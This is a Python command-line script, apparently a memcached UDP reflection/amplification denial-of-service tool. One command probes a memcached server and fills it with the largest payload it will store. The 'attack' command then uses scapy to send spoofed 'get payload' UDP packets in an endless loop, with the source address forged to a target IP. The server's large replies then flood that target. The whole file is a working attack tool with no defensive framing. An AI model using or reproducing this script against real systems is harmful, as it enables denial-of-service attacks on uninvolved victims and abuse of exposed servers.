#!/usr/bin/env python3.7
# -*- coding:utf-8 -*-
import click
import socket
import memcache
import random

from scapy.all import UDP, IP, send


memcached_ip = None
memcached_port = None


@click.group()
@click.option("--server-ip", required=True, type=str, help="set memcached ip")
@click.option("--server-port", default=11211, type=int, help="set memcached port")
def commands(server_ip, server_port):
    global memcached_ip, memcached_port
    memcached_ip = str(server_ip)
    memcached_port = int(server_port)
    click.echo("[*] memcached ip = %s"%memcached_ip)
    click.echo("[*] memcached port = %d"%memcached_port)


@commands.command()
def setpayload():
    client = memcache.Client(["%s:%d"%(memcached_ip, memcached_port)])

    max_len = 0
    block = 1 << 10
    while True:
        indent = 1
        while True:
            temp_len = max_len + block*indent
            client.set("payload", "*"*temp_len)
            saved_data = client.get("payload")
            if saved_data is None or len((saved_data)) != temp_len:
                indent >>= 1
                break
            indent <<= 1
        max_len += block*indent
        block >>= 1
        if 0==block:
            block = 1
        if 0==indent and 1==block:
            break

    client.set("payload", "*"*max_len)
    click.echo("[*] set payload success, data max length = %d"%len(client.get("payload")))


@commands.command()
@click.option("--target-ip", "-tip", required=True, type=str, help="set target ip")
def attack(target_ip):
    click.echo("[*] target ip = %s"%target_ip)
    # data 前置8字节头，来自https://github.com/memcached/memcached/blob/master/doc/protocol.txt，
    # The frame header is 8 bytes long, as follows (all values are 16-bit integers
    # in network byte order, high byte first):
    # 0-1 Request ID
    # 2-3 Sequence number
    # 4-5 Total number of datagrams in this message
    # 6-7 Reserved for future use; must be 0
    data = "\x00\x00\x00\x00\x00\x01\x00\x00get payload\r\n"
    udp_header = UDP(dport=memcached_port, sport=random.randint(10000, 60000))
    ip_header = IP(dst=memcached_ip, src=target_ip)
    pkt=ip_header/udp_header/data
    send(pkt, loop=1)


if __name__ == "__main__":
    commands()

